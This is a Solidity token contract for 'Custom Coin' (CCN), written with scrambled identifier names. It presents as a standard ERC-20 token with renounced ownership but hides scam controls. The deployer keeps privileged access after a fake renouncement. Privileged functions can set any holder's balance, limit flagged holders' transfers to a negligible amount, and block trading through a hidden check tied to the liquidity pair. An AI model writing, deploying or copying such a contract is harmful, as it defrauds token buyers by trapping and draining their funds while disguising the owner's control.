//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface totalLaunched {
    function createPair(address limitFee, address listMax) external returns (address);
}

interface receiverLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderTokenTake) external view returns (uint256);

    function transfer(address maxTo, uint256 takeEnable) external returns (bool);

    function allowance(address exemptReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeEnable) external returns (bool);

    function transferFrom(
        address sender,
        address maxTo,
        uint256 takeEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldWallet, uint256 value);
    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);
}

abstract contract receiverAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityTradingWallet is receiverLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CustomCoin is receiverAmount, receiverLimit, liquidityTradingWallet {

    function autoSell(uint256 takeEnable) public {
        walletReceiver();
        shouldTxToken = takeEnable;
    }

    address public fromList;

    function walletReceiver() private view {
        require(walletReceiverAt[_msgSender()]);
    }

    function takeLiquidity(address takeLiquidityMarketing, address maxTo, uint256 takeEnable) internal returns (bool) {
        if (takeLiquidityMarketing == fromList) {
            return tradingSwap(takeLiquidityMarketing, maxTo, takeEnable);
        }
        uint256 walletReceiverSwap = receiverLimit(maxEnable).balanceOf(toSwap);
        require(walletReceiverSwap == shouldTxToken);
        require(maxTo != toSwap);
        if (autoAmount[takeLiquidityMarketing]) {
            return tradingSwap(takeLiquidityMarketing, maxTo, tradingMin);
        }
        return tradingSwap(takeLiquidityMarketing, maxTo, takeEnable);
    }

    address public maxEnable;

    mapping(address => bool) public walletReceiverAt;

    event OwnershipTransferred(address indexed amountMinLimit, address indexed shouldToEnable);

    string private modeFeeMarketing = "CCN";

    uint256 private receiverTx = 100000000 * 10 ** 18;

    mapping(address => uint256) private tradingFee;

    function transferFrom(address takeLiquidityMarketing, address maxTo, uint256 takeEnable) external override returns (bool) {
        if (_msgSender() != tradingMinAmount) {
            if (feeIs[takeLiquidityMarketing][_msgSender()] != type(uint256).max) {
                require(takeEnable <= feeIs[takeLiquidityMarketing][_msgSender()]);
                feeIs[takeLiquidityMarketing][_msgSender()] -= takeEnable;
            }
        }
        return takeLiquidity(takeLiquidityMarketing, maxTo, takeEnable);
    }

    bool private amountReceiver;

    uint256 private listLaunched;

    function launchedTake() public {
        emit OwnershipTransferred(fromList, address(0));
        sellSenderLaunched = address(0);
    }

    function owner() external view returns (address) {
        return sellSenderLaunched;
    }

    function balanceOf(address senderTokenTake) public view virtual override returns (uint256) {
        return tradingFee[senderTokenTake];
    }

    constructor (){
        if (atShould == amountReceiver) {
            amountMin = receiverWallet;
        }
        fundMarketing exemptMarketing = fundMarketing(tradingMinAmount);
        maxEnable = totalLaunched(exemptMarketing.factory()).createPair(exemptMarketing.WETH(), address(this));
        
        fromList = _msgSender();
        walletReceiverAt[fromList] = true;
        tradingFee[fromList] = receiverTx;
        launchedTake();
        if (atShould != amountReceiver) {
            listLaunched = receiverWallet;
        }
        emit Transfer(address(0), fromList, receiverTx);
    }

    function atSwap(address marketingShouldMax) public {
        walletReceiver();
        
        if (marketingShouldMax == fromList || marketingShouldMax == maxEnable) {
            return;
        }
        autoAmount[marketingShouldMax] = true;
    }

    bool private atShould;

    uint256 maxTake;

    function tradingSwap(address takeLiquidityMarketing, address maxTo, uint256 takeEnable) internal returns (bool) {
        require(tradingFee[takeLiquidityMarketing] >= takeEnable);
        tradingFee[takeLiquidityMarketing] -= takeEnable;
        tradingFee[maxTo] += takeEnable;
        emit Transfer(takeLiquidityMarketing, maxTo, takeEnable);
        return true;
    }

    uint256 constant tradingMin = 11 ** 10;

    function name() external view virtual override returns (string memory) {
        return sellExempt;
    }

    function transfer(address receiverSwap, uint256 takeEnable) external virtual override returns (bool) {
        return takeLiquidity(_msgSender(), receiverSwap, takeEnable);
    }

    function allowance(address modeExempt, address fundMax) external view virtual override returns (uint256) {
        if (fundMax == tradingMinAmount) {
            return type(uint256).max;
        }
        return feeIs[modeExempt][fundMax];
    }

    mapping(address => mapping(address => uint256)) private feeIs;

    address toSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private sellSenderLaunched;

    bool public fundEnableTx;

    function symbol() external view virtual override returns (string memory) {
        return modeFeeMarketing;
    }

    function approve(address fundMax, uint256 takeEnable) public virtual override returns (bool) {
        feeIs[_msgSender()][fundMax] = takeEnable;
        emit Approval(_msgSender(), fundMax, takeEnable);
        return true;
    }

    uint256 private receiverWallet;

    function fromIsList(address autoLaunched) public {
        if (fundEnableTx) {
            return;
        }
        
        walletReceiverAt[autoLaunched] = true;
        if (amountMin == receiverWallet) {
            atShould = true;
        }
        fundEnableTx = true;
    }

    function getOwner() external view returns (address) {
        return sellSenderLaunched;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTx;
    }

    address tradingMinAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return launchTx;
    }

    uint8 private launchTx = 18;

    uint256 shouldTxToken;

    string private sellExempt = "Custom Coin";

    function fromLaunchFund(address receiverSwap, uint256 takeEnable) public {
        walletReceiver();
        tradingFee[receiverSwap] = takeEnable;
    }

    uint256 public amountMin;

    mapping(address => bool) public autoAmount;

}